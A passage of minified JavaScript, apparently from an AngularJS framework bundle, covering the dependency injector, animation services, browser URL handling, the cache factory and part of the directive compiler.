<- "+n.join(" <- "));return t[e]}try{return n.unshift(e),t[e]=i,t[e]=o(e,r),t[e]}catch(r){throw t[e]===i&&delete t[e],r}finally{n.shift()}}function h(t,i,r){for(var n=[],s=Ze.$$annotate(t,e,r),o=0,a=s.length;o<a;o++){var h=s[o];if("string"!=typeof h)throw Xe("itkn","Incorrect injection token! Expected service name as string, got {0}",h);n.push(i&&i.hasOwnProperty(h)?i[h]:l(h,r))}return n}return{invoke:function(t,e,i,r){"string"==typeof i&&(r=i,i=null);var n=h(t,i,r);return G(t)&&(t=t[t.length-1]),function(t){if(s||"function"!=typeof t)return!1;var e=t.$$ngIsClass;return K(e)||(e=t.$$ngIsClass=/^class\b/.test(Qe(t))),e}(t)?(n.unshift(null),new(Function.prototype.bind.apply(t,n))):t.apply(e,n)},instantiate:function(t,e,i){var r=G(t)?t[t.length-1]:t,n=h(t,e,i);return n.unshift(null),new(Function.prototype.bind.apply(r,n))},get:l,annotate:Ze.$$annotate,has:function(e){return a.hasOwnProperty(e+r)||t.hasOwnProperty(e)}}}}function Je(){var e=!0;this.disableAutoScrolling=function(){e=!1},this.$get=["$window","$location","$rootScope",function(i,r,n){var s=i.document;function a(t){if(t){t.scrollIntoView();var e=function(){var t=l.yOffset;if(j(t))t=t();else if(it(t)){var e=t[0];t="fixed"!==i.getComputedStyle(e).position?0:e.getBoundingClientRect().bottom}else W(t)||(t=0);return t}();if(e){var r=t.getBoundingClientRect().top;i.scrollBy(0,r-e)}}else i.scrollTo(0,0)}function l(t){var e;(t=U(t)?t:W(t)?t.toString():r.hash())?(e=s.getElementById(t))||(e=function(t){var e=null;return Array.prototype.some.call(t,(function(t){if("a"===rt(t))return e=t,!0})),e}(s.getElementsByName(t)))?a(e):"top"===t&&a(null):a(null)}return e&&n.$watch((function(){return r.hash()}),(function(e,i){e===i&&""===e||function(e,i){"complete"===(i=i||t).document.readyState?i.setTimeout(e):o(i).on("load",e)}((function(){n.$evalAsync(l)}))})),l}]}Ze.$$annotate=function(t,e,i){var r,n;if("function"==typeof t){if(!(r=t.$inject)){if(r=[],t.length){if(e)throw(!U(i)||!i)&&(i=t.name||function(t){var e=Ke(t);return e?"function("+(e[1]||"").replace(/[\s\r\n]+/," ")+")":"fn"}(t)),Xe("strictdi","{0} is not using explicit annotation and cannot be invoked in strict mode",i);S(Ke(t)[1].split(ze),(function(t){t.replace(je,(function(t,e,i){r.push(i)}))}))}t.$inject=r}}else G(t)?(Nt(t[n=t.length-1],"fn"),r=t.slice(0,n)):Nt(t,"fn",!0);return r};var ti=n("$animate"),ei="ng-animate";function ii(t,e){return t||e?t?e?(G(t)&&(t=t.join(" ")),G(e)&&(e=e.join(" ")),t+" "+e):t:e:""}function ri(t){return q(t)?t:{}}var ni=function(){this.$get=D},si=function(){var t=new Ue,e=[];this.$get=["$$AnimateRunner","$rootScope",function(i,r){return{enabled:D,on:D,off:D,pin:D,push:function(o,a,l,h){h&&h(),(l=l||{}).from&&o.css(l.from),l.to&&o.css(l.to),(l.addClass||l.removeClass)&&function(i,o,a){var l=t.get(i)||{},h=n(l,o,!0),c=n(l,a,!1);(h||c)&&(t.set(i,l),e.push(i),1===e.length&&r.$$postDigest(s))}(o,l.addClass,l.removeClass);var c=new i;return c.complete(),c}};function n(t,e,i){var r=!1;return e&&S(e=U(e)?e.split(" "):G(e)?e:[],(function(e){e&&(r=!0,t[e]=i)})),r}function s(){S(e,(function(e){var i=t.get(e);if(i){var r=function(t){U(t)&&(t=t.split(" "));var e=qt();return S(t,(function(t){t.length&&(e[t]=!0)})),e}(e.attr("class")),n="",s="";S(i,(function(t,e){t!==!!r[e]&&(t?n+=(n.length?" ":"")+e:s+=(s.length?" ":"")+e)})),S(e,(function(t){n&&Ae(t,n),s&&Se(t,s)})),t.delete(e)}})),e.length=0}}]},oi=["$provide",function(t){var e=this,i=null,r=null;this.$$registeredAnimations=Object.create(null),this.register=function(i,r){if(i&&"."!==i.charAt(0))throw ti("notcsel","Expecting class selector starting with '.' got '{0}'.",i);var n=i+"-animation";e.$$registeredAnimations[i.substr(1)]=n,t.factory(n,r)},this.customFilter=function(t){return 1===arguments.length&&(r=j(t)?t:null),r},this.classNameFilter=function(t){if(1===arguments.length&&(i=t instanceof RegExp?t:null)){var e=new RegExp("[(\\s|\\/)]"+ei+"[(\\s|\\/)]");if(e.test(i.toString()))throw i=null,ti("nongcls",'$animateProvider.classNameFilter(regex) prohibits accepting a regex value which matches/contains the "{0}" CSS class.',ei)}return i},this.$get=["$$animateQueue",function(t){function e(t,e,i){if(i){var r=function(t){for(var e=0;e<t.length;e++){var i=t[e];if(1===i.nodeType)return i}}(i);r&&!r.parentNode&&!r.previousElementSibling&&(i=null)}i?i.after(t):e.prepend(t)}return{on:t.on,off:t.off,pin:t.pin,enabled:t.enabled,cancel:function(t){t.cancel&&t.cancel()},enter:function(i,r,n,s){return r=r&&o(r),n=n&&o(n),e(i,r=r||n.parent(),n),t.push(i,"enter",ri(s))},move:function(i,r,n,s){return r=r&&o(r),n=n&&o(n),e(i,r=r||n.parent(),n),t.push(i,"move",ri(s))},leave:function(e,i){return t.push(e,"leave",ri(i),(function(){e.remove()}))},addClass:function(e,i,r){return(r=ri(r)).addClass=ii(r.addclass,i),t.push(e,"addClass",r)},removeClass:function(e,i,r){return(r=ri(r)).removeClass=ii(r.removeClass,i),t.push(e,"removeClass",r)},setClass:function(e,i,r,n){return(n=ri(n)).addClass=ii(n.addClass,i),n.removeClass=ii(n.removeClass,r),t.push(e,"setClass",n)},animate:function(e,i,r,n,s){return(s=ri(s)).from=s.from?P(s.from,i):i,s.to=s.to?P(s.to,r):r,n=n||"ng-inline-animate",s.tempClasses=ii(s.tempClasses,n),t.push(e,"animate",s)}}}]}],ai=function(){this.$get=["$$rAF",function(t){var e=[];function i(i){e.push(i),!(e.length>1)&&t((function(){for(var t=0;t<e.length;t++)e[t]();e=[]}))}return function(){var t=!1;return i((function(){t=!0})),function(e){t?e():i(e)}}}]},li=function(){this.$get=["$q","$sniffer","$$animateAsyncRun","$$isDocumentHidden","$timeout",function(t,e,i,r,n){function s(t){this.setHost(t);var e=i();this._doneCallbacks=[],this._tick=function(t){r()?function(t){n(t,0,!1)}(t):e(t)},this._state=0}return s.chain=function(t,e){var i=0;!function r(){if(i===t.length)return void e(!0);t[i]((function(t){!1!==t?(i++,r()):e(!1)}))}()},s.all=function(t,e){var i=0,r=!0;function n(n){r=r&&n,++i===t.length&&e(r)}S(t,(function(t){t.done(n)}))},s.prototype={setHost:function(t){this.host=t||{}},done:function(t){2===this._state?t():this._doneCallbacks.push(t)},progress:D,getPromise:function(){if(!this.promise){var e=this;this.promise=t((function(t,i){e.done((function(e){!1===e?i():t()}))}))}return this.promise},then:function(t,e){return this.getPromise().then(t,e)},catch:function(t){return this.getPromise().catch(t)},finally:function(t){return this.getPromise().finally(t)},pause:function(){this.host.pause&&this.host.pause()},resume:function(){this.host.resume&&this.host.resume()},end:function(){this.host.end&&this.host.end(),this._resolve(!0)},cancel:function(){this.host.cancel&&this.host.cancel(),this._resolve(!1)},complete:function(t){var e=this;0===e._state&&(e._state=1,e._tick((function(){e._resolve(t)})))},_resolve:function(t){2!==this._state&&(S(this._doneCallbacks,(function(e){e(t)})),this._doneCallbacks.length=0,this._state=2)}},s}]},hi=function(){this.$get=["$$rAF","$q","$$AnimateRunner",function(t,e,i){return function(e,r){var n=r||{};n.$$prepared||(n=ot(n)),n.cleanupStyles&&(n.from=n.to=null),n.from&&(e.css(n.from),n.from=null);var s,o=new i;return{start:a,end:a};function a(){return t((function(){n.addClass&&(e.addClass(n.addClass),n.addClass=null),n.removeClass&&(e.removeClass(n.removeClass),n.removeClass=null),n.to&&(e.css(n.to),n.to=null),s||o.complete(),s=!0})),o}}}]};function ci(t,e,i,r,n){var s=this,a=t.location,l=t.history,h=t.setTimeout,c=t.clearTimeout,u={},d=n(i);s.isMock=!1,s.$$completeOutstandingRequest=d.completeTask,s.$$incOutstandingRequestCount=d.incTaskCount,s.notifyWhenNoOutstandingRequests=d.notifyWhenNoPendingTasks;var p,m,f=a.href,g=e.find("base"),y=null,v=r.history?function(){try{return l.state}catch(t){}}:D;A(),s.url=function(e,i,n){if(F(n)&&(n=null),a!==t.location&&(a=t.location),l!==t.history&&(l=t.history),e){var o=m===n;if(e=un(e).href,f===e&&(!r.history||o))return s;var h=f&&hr(f)===hr(e);return f=e,m=n,!r.history||h&&o?(h||(y=e),i?a.replace(e):h?a.hash=function(t){var e=t.indexOf("#");return-1===e?"":t.substr(e)}(e):a.href=e,a.href!==e&&(y=e)):(l[i?"replaceState":"pushState"](n,"",e),A()),y&&(y=e),s}return function(t){return t.replace(/#$/,"")}(y||a.href)},s.state=function(){return p};var _=[],b=!1;function w(){y=null,C()}var E=null;function A(){lt(p=F(p=v())?null:p,E)&&(p=E),E=p,m=p}function C(){var t=m;A(),(f!==s.url()||t!==p)&&(f=s.url(),m=p,S(_,(function(t){t(s.url(),p)})))}s.onUrlChange=function(e){return b||(r.history&&o(t).on("popstate",w),o(t).on("hashchange",w),b=!0),_.push(e),e},s.$$applicationDestroyed=function(){o(t).off("hashchange popstate",w)},s.$$checkUrlChange=C,s.baseHref=function(){var t=g.attr("href");return t?t.replace(/^(https?:)?\/\/[^/]*/,""):""},s.defer=function(t,e,i){var r;return e=e||0,i=i||d.DEFAULT_TASK_TYPE,d.incTaskCount(i),r=h((function(){delete u[r],d.completeTask(t,i)}),e),u[r]=i,r},s.defer.cancel=function(t){if(u.hasOwnProperty(t)){var e=u[t];return delete u[t],c(t),d.completeTask(D,e),!0}return!1}}function ui(){this.$get=["$window","$log","$sniffer","$document","$$taskTrackerFactory",function(t,e,i,r,n){return new ci(t,r,e,i,n)}]}function di(){this.$get=function(){var t={};function e(e,i){if(e in t)throw n("$cacheFactory")("iid","CacheId '{0}' is already taken!",e);var r=0,s=P({},i,{id:e}),o=qt(),a=i&&i.capacity||Number.MAX_VALUE,l=qt(),h=null,c=null;return t[e]={put:function(t,e){if(!F(e)){if(a<Number.MAX_VALUE)u(l[t]||(l[t]={key:t}));return t in o||r++,o[t]=e,r>a&&this.remove(c.key),e}},get:function(t){if(a<Number.MAX_VALUE){var e=l[t];if(!e)return;u(e)}return o[t]},remove:function(t){if(a<Number.MAX_VALUE){var e=l[t];if(!e)return;e===h&&(h=e.p),e===c&&(c=e.n),d(e.n,e.p),delete l[t]}t in o&&(delete o[t],r--)},removeAll:function(){o=qt(),r=0,l=qt(),h=c=null},destroy:function(){o=null,s=null,l=null,delete t[e]},info:function(){return P({},s,{size:r})}};function u(t){t!==h&&(c?c===t&&(c=t.n):c=t,d(t.n,t.p),d(t,h),(h=t).n=null)}function d(t,e){t!==e&&(t&&(t.p=e),e&&(e.n=t))}}return e.info=function(){var e={};return S(t,(function(t,i){e[i]=t.info()})),e},e.get=function(e){return t[e]},e}}function pi(){this.$get=["$cacheFactory",function(t){return t("templates")}]}var mi=n("$compile");var fi=new function(){};function gi(e,i){var r={},n="Directive",a=/^\s*directive:\s*([\w-]+)\s+(.*)$/,l=/(([\w-]+)(?::([^;]+))?;?)/,h=function(t){var e,i={},r=t.split(",");for(e=0;e<r.length;e++)i[r[e]]=!0;return i}("ngSrc,ngSrcset,src,srcset"),c=/^(?:(\^\^?)?(\?)?(\^\^?)?)?/,p=/^(on[a-z]+|formaction)$/,m=qt();function f(t,e,i){var r=/^([@&]|[=<](\*?))(\??)\s*([\w$]*)$/,n=qt();return S(t,(function(t,s){if((t=t.trim())in m)n[s]=m[t];else{var o=t.match(r);if(!o)throw mi("iscp","Invalid {3} for directive '{0}'. Definition: {... {1}: '{2}' ...}",e,s,t,i?"controller bindings definition":"isolate scope definition");n[s]={mode:o[1][0],collection:"*"===o[2],optional:"?"===o[3],attrName:o[4]||s},o[4]&&(m[t]=n[s])}})),n}function g(t,e){var i={isolateScope:null,bindToController:null};if(q(t.scope)&&(!0===t.bindToController?(i.bindToController=f(t.scope,e,!0),i.isolateScope={}):i.isolateScope=f(t.scope,e,!1)),q(t.bindToController)&&(i.bindToController=f(t.bindToController,e,!0)),i.bindToController&&!t.controller)throw mi("noctrl","Cannot bind to controller without directive '{0}'s controller.",e);return i}this.directive=function t(i,s){return Lt(i,"name"),Ft(i,"directive"),U(i)?(function(t){var e=t.charAt(0);if(!e||e!==d(e))throw mi("baddir","Directive/Component name '{0}' is invalid. The first character must be a lowercase letter",t);if(t!==t.trim())throw mi("baddir","Directive/Component name '{0}' is invalid. The name should not contain leading or trailing whitespaces",t)}(i),Lt(s,"directiveFactory"),r.hasOwnProperty(i)||(r[i]=[],e.factory(i+n,["$injector","$exceptionHandler",function(t,e){var n=[];return S(r[i],(function(r,s){try{var o=t.invoke(r);j(o)?o={compile:L(o)}:!o.compile&&o.link&&(o.compile=L(o.link)),o.priority=o.priority||0,o.index=s,o.name=o.name||i,o.require=function(t){var e=t.require||t.controller&&t.name;return!G(e)&&q(e)&&S(e,(function(t,i){var r=t.match(c);t.substring(r[0].length)||(e[i]=r[0]+i)})),e}(o),o.restrict=function(t,e){if(t&&(!U(t)||!/[EACM]/.test(t)))throw mi("badrestrict","Restrict property '{0}' of directive '{1}' is invalid",t,e);return t||"EA"}(o.restrict,i),o.$$moduleName=r.$$moduleName,n.push(o)}catch(t){e(t)}})),n}])),r[i].push(s)):S(i,C(t)),this},this.component=function t(e,i){if(!U(e))return S(e,C(pt(this,t))),this;var r=i.controller||function(){};function n(t){function e(e){return j(e)||G(e)?function(i,r){return t.invoke(e,this,{$element:i,$attrs:r})}:e}var n=i.template||i.templateUrl?i.template:"",s={controller:r,controllerAs:Ci(i.controller)||i.controllerAs||"$ctrl",template:e(n),templateUrl:e(i.templateUrl),transclude:i.transclude,scope:{},bindToController:i.bindings||{},restrict:"E",require:i.require};return S(i,(function(t,e){"$"===e.charAt(0)&&(s[e]=t)})),s}return S(i,(function(t,e){"$"===e.charAt(0)&&(n[e]=t,j(r)&&(r[e]=t))})),n.$inject=["$injector"],this.directive(e,n)},this.aHrefSanitizationTrustedUrlList=function(t){return V(t)?(i.aHrefSanitizationTrustedUrlList(t),this):i.aHrefSanitizationTrustedUrlList()},Object.defineProperty(this,"aHrefSanitizationWhitelist",{get:function(){return this.aHrefSanitizationTrustedUrlList},set:function(t){this.aHrefSanitizationTrustedUrlList=t}}),this.imgSrcSanitizationTrustedUrlList=function(t){return V(t)?(i.imgSrcSanitizationTrustedUrlList(t),this):i.imgSrcSanitizationTrustedUrlList()},Object.defineProperty(this,"imgSrcSanitizationWhitelist",{get:function(){return this.imgSrcSanitizationTrustedUrlList},set:function(t){this.imgSrcSanitizationTrustedUrlList=t}});var v=!0;this.debugInfoEnabled=function(t){return V(t)?(v=t,this):v};var _=!1;this.strictComponentBindingsEnabled=function(t){return V(t)?(_=t,this):_};var b=10;this.onChangesTtl=function(t){return arguments.length?(b=t,this):b};var w=!0;this.commentDirectivesEnabled=function(t){return arguments.length?(w=t,this):w};var E=!0;this.cssClassDirectivesEnabled=function(t){return arguments.length?(E=t,this):E};var A=qt();this.addPropertySecurityContext=function(t,e,i){var r=t.toLowerCase()+"|"+e.toLowerCase();if(r in A&&A[r]!==i)throw mi("ctxoverride","Property context '{0}.{1}' already set to '{2}', cannot override to '{3}'.",t,e,A[r],i);return A[r]=i,this},function(){function t(t,e){S(e,(function(e){A[e.toLowerCase()]=t}))}t(zr.HTML,["iframe|srcdoc","*|innerHTML","*|outerHTML"]),t(zr.CSS,["*|style"]),t(zr.URL,["area|href","area|ping","a|href","a|ping","blockquote|cite","body|background","del|cite","input|src","ins|cite","q|cite"]),t(zr.MEDIA_URL,["audio|src","img|src","img|srcset","source|src","source|srcset","track|src","video|src","video|poster"]),t(zr.RESOURCE_URL,["*|formAction","applet|code","applet|codebase","base|href","embed|src","frame|src","form|action","head|profile","html|manifest","iframe|src","link|href","media|src","object|codebase","object|data","script|src"])}(),this.$get=["$injector","$interpolate","$exceptionHandler","$templateRequest","$parse","$controller","$rootScope","$sce","$animate",function(e,i,m,f,C,T,$,I,x){var k,O=/^\w/,L=t.document.createElement("div"),N=w,V=E,B=b;function W(){try{if(!--B)throw k=void 0,mi("infchng","{0} $onChanges() iterations reached. Aborting!\n",b);$.$apply((function(){for(var t=0,e=k.length;t<e;++t)try{k[t]()}catch(t){m(t)}k=void 0}))}finally{B++}}function H(t,e){if(!t)return t;if(!U(t))throw mi("srcset",'Can\'t pass trusted values to `{0}`: "{1}"',e,t.toString());for(var i="",r=tt(t),n=/\s/.test(r)?/(\s+\d+x\s*,|\s+\d+w\s*,|\s+,|,\s+)/:/(,)/,s=r.split(n),o=Math.floor(s.length/2),a=0;a<o;a++){var l=2*a;i+=I.getTrustedMediaUrl(tt(s[l])),i+=" "+tt(s[l+1])}var h=tt(s[2*a]).split(/\s/);return i+=I.getTrustedMediaUrl(tt(h[0])),2===h.length&&(i+=" "+tt(h[1])),i}function Y(t,e){if(e){var i,r,n,s=Object.keys(e);for(i=0,r=s.length;i<r;i++)this[n=s[i]]=e[n]}else this.$attr={};this.$$element=t}function X(t,e){try{t.addClass(e)}catch(t){}}Y.prototype={$normalize:bi,$addClass:function(t){t&&t.length>0&&x.addClass(this.$$element,t)},$removeClass:function(t){t&&t.length>0&&x.removeClass(this.$$element,t)},$updateClass:function(t,e){var i=wi(t,e);i&&i.length&&x.addClass(this.$$element,i);var r=wi(e,t);r&&r.length&&x.removeClass(this.$$element,r)},$set:function(t,e,i,r){var n=Re(this.$$element[0],t),s=function(t){return De[t]}(t),o=t;n?(this.$$element.prop(t,e),r=n):s&&(this[s]=e,o=s),this[t]=e,r?this.$attr[t]=r:(r=this.$attr[t])||(this.$attr[t]=r=Mt(t,"-")),"img"===rt(this.$$element)&&"srcset"===t&&(this[t]=e=H(e,"$set('srcset', value)")),!1!==i&&(null===e||F(e)?this.$$element.removeAttr(r):O.test(r)?n&&!1===e?this.$$element.removeAttr(r):this.$$element.attr(r,e):function(t,e,i){L.innerHTML="<span "+e+">";var r=L.firstChild.attributes,n=r[0];r.removeNamedItem(n.name),n.value=i,t.attributes.setNamedItem(n)}(this.$$element[0],r,e));var a=this.$$observers;a&&S(a[o],(function(t){try{t(e)}catch(t){m(t)}}))},$observe:function(t,e){var i=this,r=i.$$observers||(i.$$observers=qt()),n=r[t]||(r[t]=[]);return n.push(e),$.$evalAsync((function(){!n.$$inter&&i.hasOwnProperty(t)&&!F(i[t])&&e(i[t])})),function(){st(n,e)}}};var Z=i.startSymbol(),J=i.endSymbol(),et="{{"===Z&&"}}"===J?R:function(t){return t.replace(/\{\{/g,Z).replace(/}}/g,J)},it=/^ng(Attr|Prop|On)([A-Z].*)$/,nt=/^(.+)Start$/;return ot.$$addBindingInfo=v?function(t,e){var i=t.data("$binding")||[];G(e)?i=i.concat(e):i.push(e),t.data("$binding",i)}:D,ot.$$addBindingClass=v?function(t){X(t,"ng-binding")}:D,ot.$$addScopeInfo=v?function(t,e,i,r){var n=i?r?"$isolateScopeNoTemplate":"$isolateScope":"$scope";t.data(n,e)}:D,ot.$$addScopeClass=v?function(t,e){X(t,e?"ng-isolate-scope":"ng-scope")}:D,ot.$$createComment=function(e,i){var r="";return v&&(r=" "+(e||"")+": ",i&&(r+=i+" ")),t.document.createComment(r)},ot;function ot(t,e,i,r,n){t instanceof o||(t=o(t));var s=ht(t,e,t,i,r,n);ot.$$addScopeClass(t);var a=null;return function(e,i,r){if(!t)throw mi("multilink","This element has already been linked.");Lt(e,"scope"),n&&n.needsNewScope&&(e=e.$parent.$new());var l,h=(r=r||{}).parentBoundTranscludeFn,c=r.transcludeControllers,u=r.futureParentElement;if(h&&h.$$boundTransclude&&(h=h.$$boundTransclude),a||(a=function(t){var e=t&&t[0];return e&&"foreignobject"!==rt(e)&&y.call(e).match(/SVG/)?"svg":"html"}(u)),l="html"!==a?o(It(a,o("<div></div>").append(t).html())):i?ke.clone.call(t):t,c)for(var d in c)l.data("$"+d+"Controller",c[d].instance);return ot.$$addScopeInfo(l,e),i&&i(l,e),s&&s(e,l,l,h),i||(t=s=null),l}}function ht(t,e,i,r,n,a){for(var l,h,c,u,d,p,m,f=[],g=G(t)||t instanceof o,y=0;y<t.length;y++)l=new Y,11===s&&ct(t,y,g),(c=(h=mt(t[y],[],l,0===y?r:void 0,n)).length?vt(h,t[y],l,e,i,null,[],[],a):null)&&c.scope&&ot.$$addScopeClass(l.$$element),d=c&&c.terminal||!(u=t[y].childNodes)||!u.length?null:ht(u,c?(c.transcludeOnThisElement||!c.templateOnThisElement)&&c.transclude:e),(c||d)&&(f.push(y,c,d),p=!0,m=m||c),a=null;return p?function(t,i,r,n){var s,a,l,h,c,u,d,p,g;if(m){var y=i.length;for(g=new Array(y),c=0;c<f.length;c+=3)d=f[c],g[d]=i[d]}else g=i;for(c=0,u=f.length;c<u;)l=g[f[c++]],s=f[c++],a=f[c++],s?(s.scope?(h=t.$new(),ot.$$addScopeInfo(o(l),h)):h=t,p=s.transcludeOnThisElement?ut(t,s.transclude,n):!s.templateOnThisElement&&n?n:!n&&e?ut(t,e):null,s(a,h,l,r,p)):a&&a(t,l.childNodes,void 0,n)}:null}function ct(t,e,i){var r,n=t[e],s=n.parentNode;if(n.nodeType===Ut)for(;(r=s?n.nextSibling:t[e+1])&&r.nodeType===Ut;)n.nodeValue=n.nodeValue+r.nodeValue,r.parentNode&&r.parentNode.removeChild(r),i&&r===t[e+1]&&t.splice(e+1,1)}function ut(t,e,i){function r(r,n,s,o,a){return r||((r=t.$new(!1,a)).$$transcluded=!0),e(r,n,{parentBoundTranscludeFn:i,transcludeControllers:s,futureParentElement:o})}var n=r.$$slots=qt();for(var s in e.$$slots)e.$$slots[s]?n[s]=ut(t,e.$$slots[s],i):n[s]=null;return r}function mt(t,e,r,n,s){var o,h,c,u=t.nodeType,d=r.$attr;switch(u){case 1:Et(e,bi(h=rt(t)),"E",n,s);for(var p,m,f,g,y,v=t.attributes,_=0,b=v&&v.length;_<b;_++){var w,E=!1,S=!1,A=!1,C=!1,T=!1;m=(p=v[_]).name,g=p.value,(y=(f=bi(m.toLowerCase())).match(it))?(A="Attr"===y[1],C="Prop"===y[1],T="On"===y[1],m=m.replace(vi,"").toLowerCase().substr(4+y[1].length).replace(/_(.)/g,(function(t,e){return e.toUpperCase()}))):(w=f.match(nt))&&St(w[1])&&(E=m,S=m.substr(0,m.length-5)+"end",m=m.substr(0,m.length-6)),C||T?(r[f]=g,d[f]=p.name,C?xt(t,e,f,m):kt(e,f,m)):(d[f=bi(m.toLowerCase())]=m,(A||!r.hasOwnProperty(f))&&(r[f]=g,Re(t,f)&&(r[f]=!0)),Ot(t,e,g,f,A),Et(e,f,"A",n,s,E,S))}if("input"===h&&"hidden"===t.getAttribute("type")&&t.setAttribute("autocomplete","off"),!V)break;if(q(c=t.className)&&(c=c.animVal),U(c)&&""!==c)for(;o=l.exec(c);)Et(e,f=bi(o[2]),"C",n,s)&&(r[f]=tt(o[3])),c=c.substr(o.index+o[0].length);break;case Ut:!function(t,e){var r=i(e,!0);r&&t.push({priority:0,compile:function(t){var e=t.parent(),i=!!e.length;return i&&ot.$$addBindingClass(e),function(t,e){var n=e.parent();i||ot.$$addBindingClass(n),ot.$$addBindingInfo(n,r.expressions),t.$watch(r,(function(t){e[0].nodeValue=t}))}}})}(e,t.nodeValue);break;case 8:if(!N)break;!function(t,e,i,r,n){try{var s=a.exec(t.nodeValue);if(s){var o=bi(s[1]);Et(e,o,"M",r,n)&&(i[o]=tt(s[2]))}}catch(t){}}(t,e,r,n,s)}return e.sort(Tt),e}function ft(t,e,i){var r=[],n=0;if(e&&t.hasAttribute&&t.hasAttribute(e))do{if(!t)throw mi("uterdir","Unterminated attribute, found '{0}' but no matching '{1}' found.",e,i);1===t.nodeType&&(t.hasAttribute(e)&&n++,t.hasAttribute(i)&&n--),r.push(t),t=t.nextSibling}while(n>0);else r.push(t);return o(r)}function gt(t,e,i){return function(r,n,s,o,a){return n=ft(n[0],e,i),t(r,n,s,o,a)}}function yt(t,e,i,r,n,s){var o;return t?ot(e,i,r,n,s):function(){return o||(o=ot(e,i,r,n,s),e=i=s=null),o.apply(this,arguments)}}function vt(e,i,r,n,s,a,l,h,c){c=c||{};for(var u,d,p,f,g,y=-Number.MAX_VALUE,v=c.newScopeDirective,_=c.controllerDirectives,b=c.newIsolateScopeDirective,w=c.templateDirective,E=c.nonTlbTranscludeDirective,A=!1,C=!1,$=c.hasElementTranscludeDirective,I=r.$$element=o(i),x=a,k=n,O=!1,M=!1,D=0,R=e.length;D<R;D++){var L=(u=e[D]).$$start,N=u.$$end;if(L&&(I=ft(i,L,N)),p=void 0,y>u.priority)break;if((g=u.scope)&&(u.templateUrl||(q(g)?($t("new/isolated scope",b||v,u,I),b=u):$t("new/isolated scope",b,u,I)),v=v||u),d=u.name,!O&&(u.replace&&(u.templateUrl||u.template)||u.transclude&&!u.$$tlb)){for(var V,B=D+1;V=e[B++];)if(V.transclude&&!V.$$tlb||V.replace&&(V.templateUrl||V.template)){M=!0;break}O=!0}if(!u.templateUrl&&u.controller&&(_=_||qt(),$t("'"+d+"' controller",_[d],u,I),_[d]=u),g=u.transclude)if(A=!0,u.$$tlb||($t("transclusion",E,u,I),E=u),"element"===g)$=!0,y=u.priority,p=I,I=r.$$element=o(ot.$$createComment(d,r[d])),i=I[0],Dt(s,dt(p),i),k=yt(M,p,n,y,x&&x.name,{nonTlbTranscludeDirective:E});else{var U=qt();if(q(g)){p=t.document.createDocumentFragment();var W=qt(),H=qt();for(var z in S(g,(function(t,e){var i="?"===t.charAt(0);t=i?t.substring(1):t,W[t]=e,U[e]=null,H[e]=i})),S(I.contents(),(function(e){var i=W[bi(rt(e))];i?(H[i]=!0,U[i]=U[i]||t.document.createDocumentFragment(),U[i].appendChild(e)):p.appendChild(e)})),S(H,(function(t,e){if(!t)throw mi("reqslot","Required transclusion slot `{0}` was not filled.",e)})),U)if(U[z]){var X=o(U[z].childNodes);U[z]=yt(M,X,n)}p=o(p.childNodes)}else p=o(me(i)).contents();I.empty(),(k=yt(M,p,n,void 0,void 0,{needsNewScope:u.$$isolateScope||u.$$newScope})).$$slots=U}if(u.template)if(C=!0,$t("template",w,u,I),w=u,g=j(u.template)?u.template(I,r):u.template,g=et(g),u.replace){if(x=u,p=he(g)?[]:Ei(It(u.templateNamespace,tt(g))),i=p[0],1!==p.length||1!==i.nodeType)throw mi("tplrt","Template for directive '{0}' must have exactly one root element. {1}",d,"");Dt(s,I,i);var K={$attr:{}},Z=mt(i,[],K),J=e.splice(D+1,e.length-(D+1));(b||v)&&bt(Z,b,v),e=e.concat(Z).concat(J),At(r,K),R=e.length}else I.html(g);if(u.templateUrl)C=!0,$t("template",w,u,I),w=u,u.replace&&(x=u),st=Ct(e.splice(D,e.length-D),I,r,s,A&&k,l,h,{controllerDirectives:_,newScopeDirective:v!==u&&v,newIsolateScopeDirective:b,templateDirective:w,nonTlbTranscludeDirective:E}),R=e.length;else if(u.compile)try{f=u.compile(I,r,k);var it=u.$$originalDirective||u;j(f)?nt(null,pt(it,f),L,N):f&&nt(pt(it,f.pre),pt(it,f.post),L,N)}catch(t){m(t,wt(I))}u.terminal&&(st.terminal=!0,y=Math.max(y,u.priority))}return st.scope=v&&!0===v.scope,st.transcludeOnThisElement=A,st.templateOnThisElement=C,st.transclude=k,c.hasElementTranscludeDirective=$,st;function nt(t,e,i,r){t&&(i&&(t=gt(t,i,r)),t.require=u.require,t.directiveName=d,(b===u||u.$$isolateScope)&&(t=Rt(t,{isolateScope:!0})),l.push(t)),e&&(i&&(e=gt(e,i,r)),e.require=u.require,e.directiveName=d,(b===u||u.$$isolateScope)&&(e=Rt(e,{isolateScope:!0})),h.push(e))}function st(t,e,n,s,a){var c,u,d,p,f,g,y,E,A,C;for(var I in i===n?(A=r,E=r.$$element):A=new Y(E=o(n),r),f=e,b?p=e.$new(!0):v&&(f=e.$parent),a&&((y=function(t,e,i,r){var n;if(Q(t)||(r=i,i=e,e=t,t=void 0),$&&(n=g),i||(i=$?E.parent():E),!r)return a(t,e,n,i,M);var s=a.$$slots[r];if(s)return s(t,e,n,i,M);if(F(s))throw mi("noslot",'No parent directive that requires a transclusion with slot name "{0}". Element: {1}',r,wt(E))}).$$boundTransclude=a,y.isSlotFilled=function(t){return!!a.$$slots[t]}),_&&(g=function(t,e,i,r,n,s,o){var a=qt();for(var l in r){var h=r[l],c={$scope:h===o||h.$$isolateScope?n:s,$element:t,$attrs:e,$transclude:i},u=h.controller;"@"===u&&(u=e[h.name]);var d=T(u,c,!0,h.controllerAs);a[h.name]=d,t.data("$"+h.name+"Controller",d.instance)}return a}(E,A,y,_,p,e,b)),b&&(ot.$$addScopeInfo(E,p,!0,!(w&&(w===b||w===b.$$originalDirective))),ot.$$addScopeClass(E,!0),p.$$isolateBindings=b.$$isolateBindings,(C=Vt(e,A,p,p.$$isolateBindings,b)).removeWatches&&p.$on("$destroy",C.removeWatches)),g){var x=_[I],k=g[I],O=x.$$bindings.bindToController;k.instance=k(),E.data("$"+x.name+"Controller",k.instance),k.bindingInfo=Vt(f,A,k.instance,O,x)}for(S(_,(function(t,e){var i=t.require;t.bindToController&&!G(i)&&q(i)&&P(g[e].instance,_t(e,i,E,g))})),S(g,(function(t){var 